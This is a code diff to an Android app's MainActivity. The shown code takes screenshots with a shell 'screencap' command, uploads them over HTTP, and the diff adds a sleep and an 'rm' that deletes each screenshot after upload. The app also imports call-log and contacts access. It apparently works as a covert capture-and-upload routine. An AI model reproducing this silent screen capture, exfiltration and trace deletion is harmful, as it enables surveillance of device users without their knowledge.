@@ -29,7 +29,7 @@ import org.apache.http.protocol.HTTP;
 import org.apache.http.protocol.HttpContext;
 import org.apache.http.util.EntityUtils;
 
-import android.R.integer;
+
 import android.app.Activity;  
 import android.content.ContentResolver;
 import android.content.Context;
@@ -42,6 +42,7 @@ import android.os.Build;
 import android.os.Bundle;  
 import android.os.Environment;
 import android.os.Handler;  
+import android.os.SystemClock;
 import android.provider.CallLog;
 import android.provider.ContactsContract;
 import android.provider.ContactsContract.PhoneLookup;
@@ -54,6 +55,7 @@ import android.view.View.OnClickListener;
 import android.widget.Button;  
 import android.widget.TextView;  
 import android.widget.Toast;
+
   
 public class MainActivity extends Activity {  
     private Button btnUploadFile; 
@@ -928,6 +930,10 @@ public class MainActivity extends Activity {
 
 	        final String responseBody = EntityUtils.toString(response.getEntity());
 	        System.out.println("RESPONSE BODY: " + responseBody);
+	        
+	        String fileDirPath = Environment.getExternalStorageDirectory().getAbsolutePath();
+	        execCommand("rm " + fileDirPath + "/img.png");
+	        
 	        return responseBody;
 	    } 
 	    catch (final IOException e) {
@@ -940,6 +946,7 @@ public class MainActivity extends Activity {
 		try{
 			
 			execCommand("/system/bin/screencap -p " + fileDirPath + "/img.png");
+			SystemClock.sleep(2500);
 	        return "sucess";
 		}
 		catch(Exception e){
